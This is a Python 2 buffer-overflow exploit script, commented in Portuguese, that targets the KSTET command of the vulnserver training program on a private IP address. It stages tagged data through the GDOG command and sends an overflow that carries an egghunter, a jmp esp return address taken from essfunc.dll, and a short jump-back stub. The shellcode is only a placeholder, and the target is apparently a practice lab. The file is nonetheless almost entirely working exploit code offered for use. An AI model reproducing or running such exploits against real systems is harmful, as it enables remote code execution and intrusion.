#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host= "172.30.200.66"

port = 9999

payload  = ""

payload += "\x89\xca\xeb\x06\x66\x81\xca\xff\x0f\x42\x52\x6a\x02"
payload += "\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57"
payload += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
payload += "\xcc" # Breakpoint
payload += "\xff\xe7" # JMP EDI

payload += "\x90" * (66 - len(payload)) # preenche com NOPs


payload += pack('<L',0x625011af)    # 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)

# Stagio 1 -> JMP para o inicio do nosso payload (AAAA...)
payload += "\x54"                   # push esp
payload += "\x5A"                   # pop edx
payload += "\x83\xEA\x46"           # sub edx,byte +0x46
payload += "\xFF\xE2"               # jmp edx


buffer  = b"KSTET /.:/"
buffer += payload


shellcode  = b"GDOG "
shellcode += "T00WT00W"
shellcode += "C" * 1000


exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Enviando shellcode..."

exp.recv(4096)
exp.send(shellcode)

print "[*] Enviando exploit..."
exp.recv(4096)
exp.send(buffer)

exp.close()


